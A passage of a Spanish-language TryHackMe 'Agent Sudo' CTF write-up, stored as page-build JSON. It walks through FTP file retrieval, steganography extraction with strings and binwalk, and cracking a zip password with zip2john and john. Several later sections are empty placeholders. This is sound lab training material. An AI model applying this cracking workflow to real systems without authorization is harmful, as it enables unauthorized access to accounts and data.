To_agentJ.txt\n",{"type":15,"tag":59,"props":1035,"children":1036},{"class":61,"line":152},[1037],{"type":15,"tag":59,"props":1038,"children":1039},{},[1040],{"type":34,"value":1041},"-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg\n",{"type":15,"tag":59,"props":1043,"children":1044},{"class":61,"line":161},[1045],{"type":15,"tag":59,"props":1046,"children":1047},{},[1048],{"type":34,"value":1049},"-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png\n",{"type":15,"tag":59,"props":1051,"children":1052},{"class":61,"line":170},[1053],{"type":15,"tag":59,"props":1054,"children":1055},{},[1056],{"type":34,"value":1057},"226 Directory send OK.\n",{"type":15,"tag":23,"props":1059,"children":1060},{},[1061],{"type":34,"value":1062},"Descargamos los archivos de forma recursiva.",{"type":15,"tag":48,"props":1064,"children":1066},{"className":109,"code":1065,"language":34,"meta":7,"style":7},"ftp> prompt\nInteractive mode off.\nftp> mget .\nlocal: To_agentJ.txt remote: To_agentJ.txt\n\u003CSNIP>\nlocal: cute-alien.jpg remote: cute-alien.jpg\n\u003CSNIP>\nlocal: cutie.png remote: cutie.png\n\u003CSNIP>\n",[1067],{"type":15,"tag":55,"props":1068,"children":1069},{"__ignoreMap":7},[1070,1078,1086,1094,1102,1109,1117,1124,1132],{"type":15,"tag":59,"props":1071,"children":1072},{"class":61,"line":62},[1073],{"type":15,"tag":59,"props":1074,"children":1075},{},[1076],{"type":34,"value":1077},"ftp> prompt\n",{"type":15,"tag":59,"props":1079,"children":1080},{"class":61,"line":124},[1081],{"type":15,"tag":59,"props":1082,"children":1083},{},[1084],{"type":34,"value":1085},"Interactive mode off.\n",{"type":15,"tag":59,"props":1087,"children":1088},{"class":61,"line":134},[1089],{"type":15,"tag":59,"props":1090,"children":1091},{},[1092],{"type":34,"value":1093},"ftp> mget .\n",{"type":15,"tag":59,"props":1095,"children":1096},{"class":61,"line":143},[1097],{"type":15,"tag":59,"props":1098,"children":1099},{},[1100],{"type":34,"value":1101},"local: To_agentJ.txt remote: To_agentJ.txt\n",{"type":15,"tag":59,"props":1103,"children":1104},{"class":61,"line":152},[1105],{"type":15,"tag":59,"props":1106,"children":1107},{},[1108],{"type":34,"value":535},{"type":15,"tag":59,"props":1110,"children":1111},{"class":61,"line":161},[1112],{"type":15,"tag":59,"props":1113,"children":1114},{},[1115],{"type":34,"value":1116},"local: cute-alien.jpg remote: cute-alien.jpg\n",{"type":15,"tag":59,"props":1118,"children":1119},{"class":61,"line":170},[1120],{"type":15,"tag":59,"props":1121,"children":1122},{},[1123],{"type":34,"value":535},{"type":15,"tag":59,"props":1125,"children":1126},{"class":61,"line":179},[1127],{"type":15,"tag":59,"props":1128,"children":1129},{},[1130],{"type":34,"value":1131},"local: cutie.png remote: cutie.png\n",{"type":15,"tag":59,"props":1133,"children":1134},{"class":61,"line":188},[1135],{"type":15,"tag":59,"props":1136,"children":1137},{},[1138],{"type":34,"value":535},{"type":15,"tag":403,"props":1140,"children":1141},{},[1142],{"type":15,"tag":23,"props":1143,"children":1144},{},[1145],{"type":34,"value":1146},"Usamos el comando \"promt\" para evitar tener que confirmar manualmente la descarga de cada archivo.",{"type":15,"tag":23,"props":1148,"children":1149},{},[1150],{"type":34,"value":1151},"A simple vista, no hay nada fuera de lo usual en las im√°genes descargadas. El archivo de texto contiene el siguiente mensaje.",{"type":15,"tag":48,"props":1153,"children":1156},{"className":109,"code":1154,"filename":1155,"language":34,"meta":7,"style":7},"Dear agent J,\n\nAll these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.\n\nFrom,\nAgent C\n","To_agentJ.txt",[1157],{"type":15,"tag":55,"props":1158,"children":1159},{"__ignoreMap":7},[1160,1168,1175,1183,1190,1198],{"type":15,"tag":59,"props":1161,"children":1162},{"class":61,"line":62},[1163],{"type":15,"tag":59,"props":1164,"children":1165},{},[1166],{"type":34,"value":1167},"Dear agent J,\n",{"type":15,"tag":59,"props":1169,"children":1170},{"class":61,"line":124},[1171],{"type":15,"tag":59,"props":1172,"children":1173},{"emptyLinePlaceholder":128},[1174],{"type":34,"value":131},{"type":15,"tag":59,"props":1176,"children":1177},{"class":61,"line":134},[1178],{"type":15,"tag":59,"props":1179,"children":1180},{},[1181],{"type":34,"value":1182},"All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.\n",{"type":15,"tag":59,"props":1184,"children":1185},{"class":61,"line":143},[1186],{"type":15,"tag":59,"props":1187,"children":1188},{"emptyLinePlaceholder":128},[1189],{"type":34,"value":131},{"type":15,"tag":59,"props":1191,"children":1192},{"class":61,"line":152},[1193],{"type":15,"tag":59,"props":1194,"children":1195},{},[1196],{"type":34,"value":1197},"From,\n",{"type":15,"tag":59,"props":1199,"children":1200},{"class":61,"line":161},[1201],{"type":15,"tag":59,"props":1202,"children":1203},{},[1204],{"type":34,"value":1205},"Agent C\n",{"type":15,"tag":418,"props":1207,"children":1209},{"id":1208},"esteganograf√≠a",[1210],{"type":34,"value":1211},"Esteganograf√≠a",{"type":15,"tag":23,"props":1213,"children":1214},{},[1215,1217,1223,1225,1230,1231,1236,1238,1243],{"type":34,"value":1216},"Una de las im√°genes contiene la contrase√±a de Agent R. Debemos realizar estegoan√°lisis en busca de un mensaje escondido. Podemos realizar este proceso con muchas herramientas, pero en CTFs usualmente podremos obtener informaci√≥n oculta haciendo uso de ",{"type":15,"tag":1218,"props":1219,"children":1220},"em",{},[1221],{"type":34,"value":1222},"exiftool",{"type":34,"value":1224},", ",{"type":15,"tag":1218,"props":1226,"children":1227},{},[1228],{"type":34,"value":1229},"strings",{"type":34,"value":1224},{"type":15,"tag":1218,"props":1232,"children":1233},{},[1234],{"type":34,"value":1235},"binwalk",{"type":34,"value":1237}," y ",{"type":15,"tag":1218,"props":1239,"children":1240},{},[1241],{"type":34,"value":1242},"steghide",{"type":34,"value":1244}," (No esperes hacer uso de estas herramientas en pruebas de penetraci√≥n reales).",{"type":15,"tag":23,"props":1246,"children":1247},{},[1248,1252,1254,1258],{"type":15,"tag":1218,"props":1249,"children":1250},{},[1251],{"type":34,"value":1222},{"type":34,"value":1253}," no revela nada importante, pero ",{"type":15,"tag":459,"props":1255,"children":1256},{},[1257],{"type":34,"value":1229},{"type":34,"value":1259}," si lo hace.",{"type":15,"tag":48,"props":1261,"children":1263},{"className":50,"code":1262,"language":52,"meta":7,"style":7},"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n",[1264],{"type":15,"tag":55,"props":1265,"children":1266},{"__ignoreMap":7},[1267],{"type":15,"tag":59,"props":1268,"children":1269},{"class":61,"line":62},[1270,1274,1279,1285,1290,1294,1299,1305,1310,1315,1319,1323,1327,1331,1336,1340],{"type":15,"tag":59,"props":1271,"children":1272},{"style":66},[1273],{"type":34,"value":1229},{"type":15,"tag":59,"props":1275,"children":1276},{"style":72},[1277],{"type":34,"value":1278}," cutie.png",{"type":15,"tag":59,"props":1280,"children":1282},{"style":1281},"--shiki-default:#F97583",[1283],{"type":34,"value":1284}," |",{"type":15,"tag":59,"props":1286,"children":1287},{"style":66},[1288],{"type":34,"value":1289}," head",{"type":15,"tag":59,"props":1291,"children":1292},{"style":78},[1293],{"type":34,"value":81},{"type":15,"tag":59,"props":1295,"children":1296},{"style":78},[1297],{"type":34,"value":1298}," 20",{"type":15,"tag":59,"props":1300,"children":1302},{"style":1301},"--shiki-default:#E1E4E8",[1303],{"type":34,"value":1304}," && ",{"type":15,"tag":59,"props":1306,"children":1307},{"style":78},[1308],{"type":34,"value":1309},"echo",{"type":15,"tag":59,"props":1311,"children":1312},{"style":72},[1313],{"type":34,"value":1314}," \".....\"",{"type":15,"tag":59,"props":1316,"children":1317},{"style":1301},[1318],{"type":34,"value":1304},{"type":15,"tag":59,"props":1320,"children":1321},{"style":66},[1322],{"type":34,"value":1229},{"type":15,"tag":59,"props":1324,"children":1325},{"style":72},[1326],{"type":34,"value":1278},{"type":15,"tag":59,"props":1328,"children":1329},{"style":1281},[1330],{"type":34,"value":1284},{"type":15,"tag":59,"props":1332,"children":1333},{"style":66},[1334],{"type":34,"value":1335}," tail",{"type":15,"tag":59,"props":1337,"children":1338},{"style":78},[1339],{"type":34,"value":81},{"type":15,"tag":59,"props":1341,"children":1342},{"style":78},[1343],{"type":34,"value":1344}," 20\n",{"type":15,"tag":48,"props":1346,"children":1348},{"className":109,"code":1347,"language":34,"meta":7,"style":7},"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n\n\u003CSNIP>\nTo_agentR.txt\nW\\_z#\n2a>=\nTo_agentR.txt\nEwwT\n",[1349],{"type":15,"tag":55,"props":1350,"children":1351},{"__ignoreMap":7},[1352,1359,1366,1373,1381,1389,1397,1404],{"type":15,"tag":59,"props":1353,"children":1354},{"class":61,"line":62},[1355],{"type":15,"tag":59,"props":1356,"children":1357},{},[1358],{"type":34,"value":1262},{"type":15,"tag":59,"props":1360,"children":1361},{"class":61,"line":124},[1362],{"type":15,"tag":59,"props":1363,"children":1364},{"emptyLinePlaceholder":128},[1365],{"type":34,"value":131},{"type":15,"tag":59,"props":1367,"children":1368},{"class":61,"line":134},[1369],{"type":15,"tag":59,"props":1370,"children":1371},{},[1372],{"type":34,"value":535},{"type":15,"tag":59,"props":1374,"children":1375},{"class":61,"line":143},[1376],{"type":15,"tag":59,"props":1377,"children":1378},{},[1379],{"type":34,"value":1380},"To_agentR.txt\n",{"type":15,"tag":59,"props":1382,"children":1383},{"class":61,"line":152},[1384],{"type":15,"tag":59,"props":1385,"children":1386},{},[1387],{"type":34,"value":1388},"W\\_z#\n",{"type":15,"tag":59,"props":1390,"children":1391},{"class":61,"line":161},[1392],{"type":15,"tag":59,"props":1393,"children":1394},{},[1395],{"type":34,"value":1396},"2a>=\n",{"type":15,"tag":59,"props":1398,"children":1399},{"class":61,"line":170},[1400],{"type":15,"tag":59,"props":1401,"children":1402},{},[1403],{"type":34,"value":1380},{"type":15,"tag":59,"props":1405,"children":1406},{"class":61,"line":179},[1407],{"type":15,"tag":59,"props":1408,"children":1409},{},[1410],{"type":34,"value":1411},"EwwT\n",{"type":15,"tag":23,"props":1413,"children":1414},{},[1415,1417,1421],{"type":34,"value":1416},"Descubrimos que la imagen contiene un archivo de texto oculto. Para extraerlo hacemos uso de ",{"type":15,"tag":459,"props":1418,"children":1419},{},[1420],{"type":34,"value":1235},{"type":34,"value":465},{"type":15,"tag":48,"props":1423,"children":1425},{"className":50,"code":1424,"language":52,"meta":7,"style":7},"binwalk -e cutie.png\n",[1426],{"type":15,"tag":55,"props":1427,"children":1428},{"__ignoreMap":7},[1429],{"type":15,"tag":59,"props":1430,"children":1431},{"class":61,"line":62},[1432,1436,1441],{"type":15,"tag":59,"props":1433,"children":1434},{"style":66},[1435],{"type":34,"value":1235},{"type":15,"tag":59,"props":1437,"children":1438},{"style":78},[1439],{"type":34,"value":1440}," -e",{"type":15,"tag":59,"props":1442,"children":1443},{"style":72},[1444],{"type":34,"value":1445}," cutie.png\n",{"type":15,"tag":48,"props":1447,"children":1449},{"className":109,"code":1448,"language":34,"meta":7,"style":7},"binwalk -e cutie.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n869           0x365           Zlib compressed data, best compression\n\nWARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly\n34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\n\nWARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n",[1450],{"type":15,"tag":55,"props":1451,"children":1452},{"__ignoreMap":7},[1453,1460,1467,1475,1483,1491,1498,1506,1514,1521],{"type":15,"tag":59,"props":1454,"children":1455},{"class":61,"line":62},[1456],{"type":15,"tag":59,"props":1457,"children":1458},{},[1459],{"type":34,"value":1424},{"type":15,"tag":59,"props":1461,"children":1462},{"class":61,"line":124},[1463],{"type":15,"tag":59,"props":1464,"children":1465},{"emptyLinePlaceholder":128},[1466],{"type":34,"value":131},{"type":15,"tag":59,"props":1468,"children":1469},{"class":61,"line":134},[1470],{"type":15,"tag":59,"props":1471,"children":1472},{},[1473],{"type":34,"value":1474},"DECIMAL       HEXADECIMAL     DESCRIPTION\n",{"type":15,"tag":59,"props":1476,"children":1477},{"class":61,"line":143},[1478],{"type":15,"tag":59,"props":1479,"children":1480},{},[1481],{"type":34,"value":1482},"--------------------------------------------------------------------------------\n",{"type":15,"tag":59,"props":1484,"children":1485},{"class":61,"line":152},[1486],{"type":15,"tag":59,"props":1487,"children":1488},{},[1489],{"type":34,"value":1490},"869           0x365           Zlib compressed data, best compression\n",{"type":15,"tag":59,"props":1492,"children":1493},{"class":61,"line":161},[1494],{"type":15,"tag":59,"props":1495,"children":1496},{"emptyLinePlaceholder":128},[1497],{"type":34,"value":131},{"type":15,"tag":59,"props":1499,"children":1500},{"class":61,"line":170},[1501],{"type":15,"tag":59,"props":1502,"children":1503},{},[1504],{"type":34,"value":1505},"WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly\n",{"type":15,"tag":59,"props":1507,"children":1508},{"class":61,"line":179},[1509],{"type":15,"tag":59,"props":1510,"children":1511},{},[1512],{"type":34,"value":1513},"34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\n",{"type":15,"tag":59,"props":1515,"children":1516},{"class":61,"line":188},[1517],{"type":15,"tag":59,"props":1518,"children":1519},{"emptyLinePlaceholder":128},[1520],{"type":34,"value":131},{"type":15,"tag":59,"props":1522,"children":1523},{"class":61,"line":197},[1524],{"type":15,"tag":59,"props":1525,"children":1526},{},[1527],{"type":34,"value":1528},"WARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n",{"type":15,"tag":23,"props":1530,"children":1531},{},[1532,1534,1539,1541,1546],{"type":34,"value":1533},"Los archivos fueron extra√≠dos en una nueva carpeta. Dentro de esta encontramos un archivo zip, sin embargo ",{"type":15,"tag":1218,"props":1535,"children":1536},{},[1537],{"type":34,"value":1538},"unzip",{"type":34,"value":1540}," falla en extraer este archivo, por lo que debemos de usar ",{"type":15,"tag":459,"props":1542,"children":1543},{},[1544],{"type":34,"value":1545},"7zip",{"type":34,"value":465},{"type":15,"tag":48,"props":1548,"children":1550},{"className":50,"code":1549,"language":52,"meta":7,"style":7},"7zip x 8702.zip\n",[1551],{"type":15,"tag":55,"props":1552,"children":1553},{"__ignoreMap":7},[1554],{"type":15,"tag":59,"props":1555,"children":1556},{"class":61,"line":62},[1557,1561,1566],{"type":15,"tag":59,"props":1558,"children":1559},{"style":66},[1560],{"type":34,"value":1545},{"type":15,"tag":59,"props":1562,"children":1563},{"style":72},[1564],{"type":34,"value":1565}," x",{"type":15,"tag":59,"props":1567,"children":1568},{"style":72},[1569],{"type":34,"value":1570}," 8702.zip\n",{"type":15,"tag":418,"props":1572,"children":1574},{"id":1573},"crackeo-de-zip",[1575],{"type":34,"value":1576},"Crackeo de zip",{"type":15,"tag":23,"props":1578,"children":1579},{},[1580,1582,1587,1589,1594],{"type":34,"value":1581},"El archivo esta protegido por una contrase√±a. Para ",{"type":15,"tag":1218,"props":1583,"children":1584},{},[1585],{"type":34,"value":1586},"crackearla",{"type":34,"value":1588}," haremos uso de ",{"type":15,"tag":459,"props":1590,"children":1591},{},[1592],{"type":34,"value":1593},"zip2john",{"type":34,"value":465},{"type":15,"tag":48,"props":1596,"children":1598},{"className":50,"code":1597,"language":52,"meta":7,"style":7},"zip2john 8702.zip > zip2john.txt\n",[1599],{"type":15,"tag":55,"props":1600,"children":1601},{"__ignoreMap":7},[1602],{"type":15,"tag":59,"props":1603,"children":1604},{"class":61,"line":62},[1605,1609,1614,1619],{"type":15,"tag":59,"props":1606,"children":1607},{"style":66},[1608],{"type":34,"value":1593},{"type":15,"tag":59,"props":1610,"children":1611},{"style":72},[1612],{"type":34,"value":1613}," 8702.zip",{"type":15,"tag":59,"props":1615,"children":1616},{"style":1281},[1617],{"type":34,"value":1618}," >",{"type":15,"tag":59,"props":1620,"children":1621},{"style":72},[1622],{"type":34,"value":1623}," zip2john.txt\n",{"type":15,"tag":23,"props":1625,"children":1626},{},[1627,1632,1634,1639],{"type":15,"tag":1218,"props":1628,"children":1629},{},[1630],{"type":34,"value":1631},"Crackeamos",{"type":34,"value":1633}," la contrase√±a con ",{"type":15,"tag":459,"props":1635,"children":1636},{},[1637],{"type":34,"value":1638},"john",{"type":34,"value":465},{"type":15,"tag":48,"props":1641,"children":1643},{"className":50,"code":1642,"language":52,"meta":7,"style":7},"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n",[1644],{"type":15,"tag":55,"props":1645,"children":1646},{"__ignoreMap":7},[1647],{"type":15,"tag":59,"props":1648,"children":1649},{"class":61,"line":62},[1650,1654,1659],{"type":15,"tag":59,"props":1651,"children":1652},{"style":66},[1653],{"type":34,"value":1638},{"type":15,"tag":59,"props":1655,"children":1656},{"style":78},[1657],{"type":34,"value":1658}," --wordlist=/usr/share/wordlists/rockyou.txt",{"type":15,"tag":59,"props":1660,"children":1661},{"style":72},[1662],{"type":34,"value":1623},{"type":15,"tag":48,"props":1664,"children":1666},{"className":109,"code":1665,"language":34,"meta":7,"style":7},"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n\n\u003CSNIP>\nalien            (8702.zip/To_agentR.txt)\n1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n",[1667],{"type":15,"tag":55,"props":1668,"children":1669},{"__ignoreMap":7},[1670,1677,1684,1691,1699,1707,1715],{"type":15,"tag":59,"props":1671,"children":1672},{"class":61,"line":62},[1673],{"type":15,"tag":59,"props":1674,"children":1675},{},[1676],{"type":34,"value":1642},{"type":15,"tag":59,"props":1678,"children":1679},{"class":61,"line":124},[1680],{"type":15,"tag":59,"props":1681,"children":1682},{"emptyLinePlaceholder":128},[1683],{"type":34,"value":131},{"type":15,"tag":59,"props":1685,"children":1686},{"class":61,"line":134},[1687],{"type":15,"tag":59,"props":1688,"children":1689},{},[1690],{"type":34,"value":535},{"type":15,"tag":59,"props":1692,"children":1693},{"class":61,"line":143},[1694],{"type":15,"tag":59,"props":1695,"children":1696},{},[1697],{"type":34,"value":1698},"alien            (8702.zip/To_agentR.txt)\n",{"type":15,"tag":59,"props":1700,"children":1701},{"class":61,"line":152},[1702],{"type":15,"tag":59,"props":1703,"children":1704},{},[1705],{"type":34,"value":1706},"1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1\n",{"type":15,"tag":59,"props":1708,"children":1709},{"class":61,"line":161},[1710],{"type":15,"tag":59,"props":1711,"children":1712},{},[1713],{"type":34,"value":1714},"Use the \"--show\" option to display all of the cracked passwords reliably\n",{"type":15,"tag":59,"props":1716,"children":1717},{"class":61,"line":170},[1718],{"type":15,"tag":59,"props":1719,"children":1720},{},[1721],{"type":34,"value":1722},"Session completed.\n",{"type":15,"tag":23,"props":1724,"children":1725},{},[1726],{"type":34,"value":1727},"El archivo descomprimido contiene el siguiente mensaje.",{"type":15,"tag":48,"props":1729,"children":1732},{"className":109,"code":1730,"filename":1731,"language":34,"meta":7,"style":7},"Agent C,\n\nWe need to send the picture to 'QXJlYTUx' as soon as possible!\n\nBy,\nAgent R\n","_cutie.png.extracted/To_agentR.txt",[1733],{"type":15,"tag":55,"props":1734,"children":1735},{"__ignoreMap":7},[1736,1744,1751,1759,1766,1774],{"type":15,"tag":59,"props":1737,"children":1738},{"class":61,"line":62},[1739],{"type":15,"tag":59,"props":1740,"children":1741},{},[1742],{"type":34,"value":1743},"Agent C,\n",{"type":15,"tag":59,"props":1745,"children":1746},{"class":61,"line":124},[1747],{"type":15,"tag":59,"props":1748,"children":1749},{"emptyLinePlaceholder":128},[1750],{"type":34,"value":131},{"type":15,"tag":59,"props":1752,"children":1753},{"class":61,"line":134},[1754],{"type":15,"tag":59,"props":1755,"children":1756},{},[1757],{"type":34,"value":1758},"We need to send the picture to 'QXJlYTUx' as soon as possible!\n",{"type":15,"tag":59,"props":1760,"children":1761},{"class":61,"line":143},[1762],{"type":15,"tag":59,"props":1763,"children":1764},{"emptyLinePlaceholder":128},[1765],{"type":34,"value":131},{"type":15,"tag":59,"props":1767,"children":1768},{"class":61,"line":152},[1769],{"type":15,"tag":59,"props":1770,"children":1771},{},[1772],{"type":34,"value":1773},"By,\n",{"type":15,"tag":59,"props":1775,"children":1776},{"class":61,"line":161},[1777],{"type":15,"tag":59,"props":1778,"children":1779},{},[1780],{"type":34,"value":797},{"type":15,"tag":23,"props":1782,"children":1783},{},[1784,1786,1791],{"type":34,"value":1785},"Al principio esto no parece sernos de utilidad, pero la cadena de texto \"QXJlYTUx\" puede estar codificada. Ingresamos esta cadena de texto en ",{"type":15,"tag":459,"props":1787,"children":1788},{},[1789],{"type":34,"value":1790},"CyberChef",{"type":34,"value":1792},". La pagina autom√°ticamente reconoce que esta cadena de texto esta codificada en Base64. Al decodificarla obtenemos la frase \"Area51\".",{"type":15,"tag":23,"props":1794,"children":1795},{},[1796],{"type":34,"value":1797},"¬øObtuvimos la contrase√±a de SSH? Resulta no ser valida. Si esta imagen contiene un archivo escondido, probablemente la otra imagen tambi√©n.",{"type":15,"tag":23,"props":1799,"children":1800},{},[1801,1805,1807],{"type":15,"tag":459,"props":1802,"children":1803},{},[1804],{"type":34,"value":1229},{"type":34,"value":1806}," revela ",{"type":15,"tag":55,"props":1808,"children":1810},{"className":1809},[],[1811],{"type":34,"value":1812},"12345",{"type":15,"tag":36,"props":1814,"children":1816},{"id":1815},"escalada-de-privilegios",[1817],{"type":34,"value":1818},"Escalada de privilegios",{"type":15,"tag":23,"props":1820,"children":1821},{},[1822],{"type":34,"value":1823},"Descripci√≥n",{"type":15,"tag":36,"props":1825,"children":1827},{"id":1826},"persistencia",[1828],{"type":34,"value":1829},"Persistencia",{"type":15,"tag":23,"props":1831,"children":1832},{},[1833],{"type":34,"value":1823},{"type":15,"tag":36,"props":1835,"children":1837},{"id":1836},"post-root",[1838],{"type":34,"value":1839},"Post-Root",{"type":15,"tag":23,"props":1841,"children":1842},{},[1843],{"type":34,"value":1823},{"type":15,"tag":36,"props":1845,"children":1847},{"id":1846},"resumen-ejecutivo",[1848],{"type":34,"value":1849},"Resumen ejecutivo",{"type":15,"tag":23,"props":1851,"children":1852},{},[1853],{"type":34,"value":1823},{"type":15,"tag":36,"props":1855,"children":1857},{"id":1856},"remediaci√≥n",[1858],{"type":34,"value":1859},"Remediaci√≥n",{"type":15,"tag":1861,"props":1862,"children":1863},"ol",{},[1864],{"type":15,"tag":1865,"props":1866,"children":1867},"li",{},[1868],{"type":34,"value":1869},"Evita el uso de contrase√±as d√©biles.",{"type":15,"tag":36,"props":1871,"children":1873},{"id":1872},"conclusiones",[1874],{"type":34,"value":1875},"Conclusiones",{"type":15,"tag":23,"props":1877,"children":1878},{},[1879],{"type":34,"value":1823},{"type":15,"tag":1881,"props":1882,"children":1883},"style",{},[1884],{"type":34,"value":1885},"html .default .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}",{"title":7,"searchDepth":124,"depth":124,"links":1887},[1888,1889,1893,1899,1900,1901,1902,1903,1904],{"id":38,"depth":124,"text":41},{"id":413,"depth":124,"text":416,"children":1890},[1891,1892],{"id":420,"depth":134,"text":423},{"id":431,"depth":134,"text":434},{"id":810,"depth":124,"text":813,"children":1894},[1895,1896,1897,1898],{"id":816,"depth":134,"text":819},{"id":852,"depth":134,"text":855},{"id":1208,"depth":134,"text":1211},{"id":1573,"depth":134,"text":1576},{"id":1815,"depth":124,"text":1818},{"id":1826,"depth":124,"text":1829},{"id":1836,"depth":124,"text":1839},{"id":1846,"depth":124,"text":1849},{"id":1856,"depth":124,"text":1859},{"id":1872,"depth":124,"text":1875},"markdown","content:writeups:tryhackme-agent-sudo.md","content","writeups/tryhackme-agent-sudo.md","writeups/tryhackme-agent-sudo","md",1748801183859]